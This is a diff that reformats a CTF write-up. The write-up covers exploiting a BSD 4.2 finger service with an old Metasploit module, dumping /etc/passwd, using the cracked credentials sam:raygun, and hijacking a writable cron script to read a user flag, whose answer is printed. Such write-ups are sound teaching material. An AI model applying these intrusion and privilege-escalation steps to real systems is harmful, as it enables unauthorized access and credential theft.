@@ -18,7 +18,7 @@ We're only given port 79. With some initial testing, we can confirm that this is
 
 There are a lot of old exploits for this service, and based on the challenge description, this instance is probably vulnerable to one of those old exploits. Furthermore, the name of the root user is "Charlie Root", which is only seen in BSD 4.2, which is the version vulnerable to a [remote buffer overflow](https://www.exploit-db.com/exploits/19039).
 
-```text
+```
 ➜  ~ finger root@tasks.yauzactf.com
 [tasks.yauzactf.com]
 Login name: root      			In real life: Charlie Root
@@ -29,13 +29,13 @@ No Plan.
 
 Luckily, there is a Metasploit module for this exploit, which was used by the Morris Worm back in the 1980s.
 
-![](../../.gitbook/assets/screenshot-2021-08-30-at-3.55.33-pm.png)
+![](<../../.gitbook/assets/Screenshot 2021-08-30 at 3.55.33 PM.png>)
 
 ### Sam User
 
-Once we're in, we notice under `/usr/guest` that there are three users: `sam`, `mckusick` and `karels` \(user directories used to be in `/usr` before the `/home` directory was used\). We could dump the `/etc/passwd` file and crack the hashes \(password shadowing was not yet a thing on BSD 4.2\):
+Once we're in, we notice under `/usr/guest` that there are three users: `sam`, `mckusick` and `karels` (user directories used to be in `/usr` before the `/home` directory was used). We could dump the `/etc/passwd` file and crack the hashes (password shadowing was not yet a thing on BSD 4.2):
 
-```text
+```
 root:NO PASSWORD:0:10:Charlie &:/:/bin/csh
 toor:NO PASSWORD:0:10:Bourne-again Superuser:/:
 operator:NO PASSWORD:2:28:System &:/usr/guest/operator:/bin/csh
@@ -64,21 +64,20 @@ Using the `sam:raygun` credentials, we can `su` to the `sam` user.
 
 If we look at the `crontab.local` file, we see that a Cron job is run as the `karels` user every minute.
 
-```text
+```
 cat /usr/lib/crontab.local
 * * * * * karels /usr/guest/sam/cronwatch.sh
 ```
 
 The `cronwatch.sh` file is in the `sam` user's directory, so we can control the commands that are run.
 
-```text
+```
 echo "cp /usr/guest/karels/user_flag.txt /tmp; chmod a=r /tmp/user_flag.txt" > cronwatch.sh
 ```
 
 After a minute, we are able to read the `user_flag.txt` file.
 
-```text
+```
 cat /tmp/user_flag.txt
 YauzaCTF{l1k3_gh0st_1n_th3_w1r3s}
 ```
-
